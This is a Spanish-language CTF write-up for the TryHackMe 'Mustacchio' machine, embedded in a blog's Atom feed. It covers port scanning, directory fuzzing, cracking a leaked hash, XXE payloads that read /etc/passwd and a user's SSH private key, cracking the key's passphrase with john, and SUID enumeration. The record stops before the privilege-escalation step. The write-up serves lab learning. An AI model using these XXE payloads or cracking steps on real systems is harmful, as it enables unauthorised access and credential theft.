@@ -1,0 +1,448 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-03T21:23:48-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">B0ySie7e</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>B0Y-SIE7E</name></author><entry><title type="html">Mustacchio- Tryhackme</title><link href="http://localhost:4000/thm-Mustacchio/" rel="alternate" type="text/html" title="Mustacchio- Tryhackme" /><published>2021-09-04T00:00:00-04:00</published><updated>2021-09-04T00:00:00-04:00</updated><id>http://localhost:4000/thm-Mustacchio</id><content type="html" xml:base="http://localhost:4000/thm-Mustacchio/">&lt;h4 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;Usamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS --min-rate 5000&lt;/code&gt; para ir mucho mas rapido con el escaneo, luego lo guardaremos en el archivo allportsScan. Luego del escaneo se tendra el siguiente resultado.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sie7e$ nmap -p- --open -sS --min-rate 5000 -Pn -vvv -oG allportsScan &amp;lt;&amp;lt;IP target&amp;gt;&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;c&quot;&gt;# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)&lt;/span&gt;
+  Host: &amp;lt;IP target&amp;gt; &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;    Status: Up
+  Host: &amp;lt;IP target&amp;gt; &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8765/open/tcp//ultraseek-http///       Ignored State: filtered &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65532&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Luego de tener reconocido los puertos abiertos, vamos a escanear que servicios corren en dichos puertos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sie7e&amp;gt;$ nmap -p22,80,8765 -sC -sS -vvvv -oN servicesScan &amp;lt;IP target&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      Nmap scan report &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;IP target&amp;gt;
+      Host is up, received echo-reply ttl 63 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.72s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+      Scanned at 2021-08-12 18:44:18 EDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;16s
+
+      PORT     STATE SERVICE        REASON
+      22/tcp   open  ssh            syn-ack ttl 63
+      | ssh-hostkey: 
+      |   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
+      |   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+      |   256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
+      80/tcp   open  http           syn-ack ttl 63
+      | http-methods: 
+      |_  Supported Methods: GET HEAD POST OPTIONS
+      | http-robots.txt: 1 disallowed entry 
+      |_/
+      |_http-title: Mustacchio | Home
+      8765/tcp open  ultraseek-http syn-ack ttl 63
+
+      Read data files from: /usr/bin/../share/nmap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;En el puerto 22, no vemos nada interesante por lo que vamos a revisar los puertos 80 y 8765. Al ingresar al Firefox con estos puerto nos encontramos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;center&gt;
+&amp;lt;a&lt;img src=&quot;https://i.ibb.co/dWTw4VS/mustacchio-01.png&quot; alt=&quot;mustacchio-01&quot; border=&quot;0&quot; /&gt;&amp;lt;/a&amp;gt;
+&lt;/center&gt;
+&lt;ul&gt;
+  &lt;li&gt;Ahora vamos a realizar fuzzing contra la pagina web, para enumerar directorios existentes&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sie7e&amp;gt;$ wfuzz -c -f directoryWebScan,raw -w /usr/share/wordlists/dirb/common.txt --hc 404 -u http://&amp;lt;IP target&amp;gt;/FUZZ&lt;/code&gt;&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+
+  Target: http://&amp;lt;IP target&amp;gt;/FUZZ
+  Total requests: 4614
+
+  &lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+  ID           Response   Lines    Word       Chars       Payload                                                                                                              
+  &lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+
+  000000001:   200        72 L     148 W      1752 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;http://&amp;lt;IP target&amp;gt;/&quot;&lt;/span&gt;                                                                                                
+  000000011:   403        9 L      28 W       276 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;.hta&quot;&lt;/span&gt;                                                                                                               
+  000000013:   403        9 L      28 W       276 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;.htpasswd&quot;&lt;/span&gt;                                                                                                          
+  000000012:   403        9 L      28 W       276 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;.htaccess&quot;&lt;/span&gt;                                                                                                          
+  000001121:   301        9 L      28 W       311 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;custom&quot;&lt;/span&gt;                                                                                                             
+  000001648:   301        9 L      28 W       310 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;fonts&quot;&lt;/span&gt;                                                                                                              
+  000001991:   301        9 L      28 W       311 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;images&quot;&lt;/span&gt;                                                                                                             
+  000002020:   200        72 L     148 W      1752 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;index.html&quot;&lt;/span&gt;                                                                                                         
+  000003436:   200        2 L      4 W        28 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt;                                                                                                         
+  000003588:   403        9 L      28 W       276 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;server-status&quot;&lt;/span&gt;                                                                                                      
+
+  Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
+  Processed Requests: 4614
+  Filtered Requests: 4604
+  Requests/sec.: 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;h3 id=&quot;explotacion&quot;&gt;EXPLOTACION&lt;/h3&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Encontramos algunas rutas en las cuales podemos husmear un poco, la que mas interesante es la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/custom&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;center&gt;
+&lt;a&gt;&lt;img src=&quot;https://i.ibb.co/YjF0PR6/mustacchio-02.png&quot; alt=&quot;mustacchio-02&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+&lt;p&gt;Encontramos unos archivos, las cuales el mas interesante es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users.bak&lt;/code&gt;  asi que vamos a revisar de que se trata.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlitebrowser users.bak 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;center&gt;
+&lt;a&gt;&lt;img src=&quot;https://i.ibb.co/0QGVPyJ/mustacchio-03.jpg&quot; alt=&quot;mustacchio-03&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+
+&lt;p&gt;por lo que se tiene un hash, por lo que usaremos
+&lt;a href=&quot;https://crackstation.net/&quot;&gt;CrackStation&lt;/a&gt; para poner crack dicho hash. Tu podrias usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hascat&lt;/code&gt; o lo que gustes&lt;/p&gt;
+
+&lt;center&gt;
+&lt;a&gt;&lt;img src=&quot;https://i.ibb.co/ygFYPVy/mustacchio-04.png&quot; alt=&quot;mustacchio-04&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Teniendo las credenciales, ahora podemos logearnos, en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://&amp;lt;IP target&amp;gt;:8765&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;center&gt;
+&lt;a&gt;&lt;img src=&quot;https://i.ibb.co/c6ymwHV/mustacchio-06.png&quot; alt=&quot;mustacchio-06&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ingresamos y vemos un panel en la cual revisamos el codigo fuente&lt;/li&gt;
+&lt;/ul&gt;
+&lt;center&gt;
+    &lt;a href=&quot;https://i.ibb.co/FWL94Zq/mustacchio-06.png&quot;&gt;&lt;img src=&quot;https://i.ibb.co/FWL94Zq/mustacchio-06.png&quot; alt=&quot;mustacchio-06&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+&lt;p&gt;Vemos que se podemos escribir, pero en formato xml y los parametros que se necesitan son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;comment&amp;gt;&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;name&amp;gt;&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;autor&amp;gt;&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;com&amp;gt;&lt;/code&gt;. Por otra parte vemos un comentario que nos indica un nombre de un usuario el cual es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;barry&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Entonces tendriamos la siguiente estructura de xml&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;?&amp;gt;
+&amp;lt;comment&amp;gt;
+  &amp;lt;name&amp;gt;Sie7e&amp;lt;/name&amp;gt;
+  &amp;lt;author&amp;gt;Barry &amp;lt;/author&amp;gt;
+  &amp;lt;com&amp;gt;Esto es una prueba&amp;lt;/com&amp;gt;
+&amp;lt;/comment&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;podemos encontrar muchos payloads y hacerlo de filtrar informacion a nuestro gusto &lt;a href=&quot;https://github.com/payloadbox/xxe-injection-payload-list&quot;&gt;xxe-injection-payloads-list&lt;/a&gt;,  yo lo hice de la siguiente forma:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;?&amp;gt;
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE foo &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ENTITY xxe SYSTEM &lt;span class=&quot;s2&quot;&gt;&quot;file:///etc/passwd&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;]&amp;gt;&lt;/span&gt;
+&amp;lt;comment&amp;gt;
+  &amp;lt;name&amp;gt;Sie7e&amp;lt;/name&amp;gt;
+  &amp;lt;author&amp;gt;Barry &amp;lt;/author&amp;gt;
+  &amp;lt;com&amp;gt;&amp;amp;xxe&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;/com&amp;gt;
+&amp;lt;/comment&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;center&gt;
+&lt;a href=&quot;https://ibb.co/z473CtW&quot;&gt;&lt;img src=&quot;https://i.ibb.co/jrWCqj9/mustacchio-07.jpg&quot; alt=&quot;mustacchio-07&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+&lt;ul&gt;
+  &lt;li&gt;Para ver la ssh del usuario de barry:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;?&amp;gt;
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE foo &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ENTITY xxe SYSTEM &lt;span class=&quot;s2&quot;&gt;&quot;file:///home/barry/.ssh/id_rsa&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;]&amp;gt;&lt;/span&gt;
+&amp;lt;comment&amp;gt;
+  &amp;lt;name&amp;gt;Sie7e&amp;lt;/name&amp;gt;
+  &amp;lt;author&amp;gt;Barry &amp;lt;/author&amp;gt;
+  &amp;lt;com&amp;gt;&amp;amp;xxe&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;/com&amp;gt;
+&amp;lt;/comment&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;center&gt;
+&lt;a href=&quot;https://ibb.co/yYLshxY&quot;&gt;&lt;img src=&quot;https://i.ibb.co/ZYyTHbY/mustacchio-08.jpg&quot; alt=&quot;mustacchio-08&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;/center&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ya tendriamos la ssh de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;barry&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;cracking-irsa&quot;&gt;CRACKING IRSA&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Tenemos la id_rsa, la cual nos permitira logearnos a travez de ssh
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa barry@&amp;lt;IP target&amp;gt;
+Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'id_rsa'&lt;/span&gt;: 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Nos pide la contraseña del id_rsa mas no del usuario, entonces usaremos ssh2jhon.py para obtener el hash y luego crackear con john y obtener la contarseña
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 ssh2john.py id_rsa &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Ahora ya podemos usar john para crackear el hash y obtener la contraseña del archivo id_rsa
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash
+&lt;/span&gt;Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RSA/DSA/EC/OPENSSH &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH private keys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KDF/cipher &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/AES &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/3DES &lt;span class=&quot;nv&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Bcrypt/AES]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 0 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
+Cost 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
+Will run 6 OpenMP threads
+Note: This format may emit &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives, so it will keep trying even after
+finding a possible candidate.
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+&lt;span class=&quot;k&quot;&gt;********&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:04 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-06-12 03:34&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.2277g/s 3266Kp/s 3266Kc/s 3266KC/s     1990..&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;7¡Vamos!
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;escalar-privilegios&quot;&gt;ESCALAR PRIVILEGIOS&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Ahora a logearnos por ssh&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; irsa barry@&amp;lt;IP target&amp;gt; 
+  The authenticity of host &amp;lt;IP target&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;lt;IP target&amp;gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; cant be established.
+  ECDSA key fingerprint is SHA256:ZZet5QyZ8Pn5+08sVBFZdDzP/6yZEQeNpRZEd5DLLks.
+  Are you sure you want to &lt;span class=&quot;k&quot;&gt;continue &lt;/span&gt;connecting &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;/no/[fingerprint]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;? &lt;span class=&quot;nb&quot;&gt;yes
+  &lt;/span&gt;Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;'&amp;lt;IP target&amp;gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
+  Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'irsa'&lt;/span&gt;: 
+  Welcome to Ubuntu 16.04.7 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.4.0-210-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
+  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
+  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage
+
+  34 packages can be updated.
+  16 of these updates are security updates.
+  To see these additional updates run: apt list &lt;span class=&quot;nt&quot;&gt;--upgradable&lt;/span&gt;
+
+
+
+  The programs included with the Ubuntu system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
+  individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.
+
+  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+  applicable law.
+
+  barry@mustacchio:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+  &lt;/span&gt;user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Ahora precedemos a &lt;a href=&quot;https://byte-mind.net/enumeracion-y-escalado-de-privilegios-en-linux/&quot;&gt;enumerar para escalar privilegios&lt;/a&gt;, buscamos archivos con permisos de SIUD&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;barry@mustacchio:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/home/joe/live_log
+/bin/ping
+/bin/ping6
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/su
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Un archivo nos llama la atención &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/joe/live_log&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;barry@mustacchio:/home/joe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 28
+drwxr-xr-x 2 joe  joe   4096 Jun 12 15:48 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 4 root root  4096 Jun 12 15:48 ..
+&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 16832 Jun 12 15:48 live_log
+barry@mustacchio:/home/joe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings live_log
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+u+UH
+&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;A&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;A^A_
+Live Nginx Log Reader
+&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /var/log/nginx/access.log
